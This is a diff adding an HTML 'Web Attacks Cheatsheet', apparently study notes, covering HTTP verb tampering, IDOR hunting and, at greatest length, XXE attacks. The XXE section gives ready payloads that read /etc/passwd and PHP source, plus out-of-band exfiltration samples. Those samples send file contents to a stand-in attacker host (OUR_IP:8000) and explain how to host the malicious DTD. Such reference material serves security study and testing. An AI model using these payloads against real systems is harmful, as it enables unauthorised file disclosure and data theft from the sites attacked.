@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Attacks Cheatsheet</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            padding: 20px;
+            max-width: 1000px;
+            margin: auto;
+            background-color: #000;
+            color: #0f0;
+            background-image: url('https://www.transparenttextures.com/patterns/asfalt-light.png');
+        }
+        h1, h2, h3, h4, h5, h6 {
+            border-bottom: 1px solid #0f0;
+            padding-bottom: 0.3em;
+            margin-top: 1.5em;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 20px;
+            background-color: rgba(0, 0, 0, 0.8);
+        }
+        table, th, td {
+            border: 1px solid #0f0;
+        }
+        th, td {
+            padding: 8px;
+            text-align: left;
+        }
+        th {
+            background-color: rgba(0, 255, 0, 0.2);
+        }
+        code {
+            background-color: #333;
+            color: #0f0;
+            padding: 2px 4px;
+            border-radius: 4px;
+        }
+        pre {
+            background-color: #333;
+            color: #0f0;
+            padding: 10px;
+            border-radius: 4px;
+            overflow-x: auto;
+        }
+        blockquote {
+            border-left: 4px solid #0f0;
+            padding-left: 1em;
+            color: #666;
+        }
+        .section-divider {
+            border-top: 1px solid #0f0;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>Web Attacks Cheatsheet</h1>
+
+    <div class="section-divider"></div>
+    <h2>HTTP Verb Tampering</h2>
+    <ul>
+        <li><code>HEAD</code></li>
+        <li><code>PUT</code></li>
+        <li><code>DELETE</code></li>
+        <li><code>OPTIONS</code></li>
+        <li><code>PATCH</code></li>
+    </ul>
+    <table>
+        <tr>
+            <th>Command</th>
+            <th>Description</th>
+        </tr>
+        <tr>
+            <td><code>-X OPTIONS</code></td>
+            <td>Set HTTP Method with Curl</td>
+        </tr>
+    </table>
+
+    <div class="section-divider"></div>
+    <h2>IDOR</h2>
+    <ul>
+        <li>Identify IDORS in <code>URL parameters & APIs</code></li>
+        <li>Identify IDORS in <code>AJAX Calls</code></li>
+        <li>Identify IDORS by <code>understanding reference hashing/encoding</code></li>
+        <li>Identify IDORS by <code>comparing user roles</code></li>
+    </ul>
+    <table>
+        <tr>
+            <th>Command</th>
+            <th>Description</th>
+        </tr>
+        <tr>
+            <td><code>md5sum</code></td>
+            <td>MD5 hash a string</td>
+        </tr>
+        <tr>
+            <td><code>base64</code></td>
+            <td>Base64 encode a string</td>
+        </tr>
+    </table>
+
+    <div class="section-divider"></div>
+    <h2>XXE</h2>
+    <table>
+        <tr>
+            <th>Code</th>
+            <th>Description</th>
+        </tr>
+        <tr>
+            <td><code>&lt;!ENTITY xxe SYSTEM "http://localhost/email.dtd"&gt;</code></td>
+            <td>Define External Entity to a URL</td>
+        </tr>
+        <tr>
+            <td><code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code></td>
+            <td>Define External Entity to a file path</td>
+        </tr>
+        <tr>
+            <td><code>&lt;!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;</code></td>
+            <td>Read PHP source code with base64 encode filter</td>
+        </tr>
+        <tr>
+            <td><code>&lt;!ENTITY % error "&lt;!ENTITY content SYSTEM '%nonExistingEntity;/%file;'&gt;"&gt;</code></td>
+            <td>Reading a file through a PHP error</td>
+        </tr>
+        <tr>
+            <td><code>&lt;!ENTITY % oob "&lt;!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'&gt;"&gt;</code></td>
+            <td>Reading a file OOB exfiltration</td>
+        </tr>
+    </table>
+    
+    <div class="section-divider"></div>
+    <h3>Sample Exfil XXE to put in request</h3>
+    <pre>
+&lt;!DOCTYPE email [
+  &lt;!ENTITY % begin "&lt;![CDATA["&gt; &lt;!-- prepend the beginning of the CDATA tag --&gt;
+  &lt;!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"&gt; &lt;!-- reference external file --&gt;
+  &lt;!ENTITY % end "]]&gt;"&gt; &lt;!-- append the end of the CDATA tag --&gt;
+  &lt;!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"&gt; &lt;!-- reference our external DTD --&gt;
+  %xxe;
+]&gt;
+...
+&lt;email&gt;&amp;joined;&lt;/email&gt; &lt;!-- reference the &amp;joined; entity to print the file content --&gt;
+
+Run this on your attacking machine:
+echo '&lt;!ENTITY joined "%begin;%file;%end;"&gt;' &gt; xxe.dtd
+$ python3 -m http.server 8000
+    </pre>
+
+    <h3>This is how to use error handling:</h3>
+    <pre>
+Host this xxd file:
+&lt;!ENTITY % file SYSTEM "file:///etc/hosts"&gt;
+&lt;!ENTITY % error "&lt;!ENTITY content SYSTEM '%nonExistingEntity;/%file;'&gt;"&gt;
+
+Then use this in the error request:
+&lt;!DOCTYPE email [ 
+  &lt;!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd"&gt;
+  %remote;
+  %error;
+]&gt;
+    </pre>
+</body>
+</html>
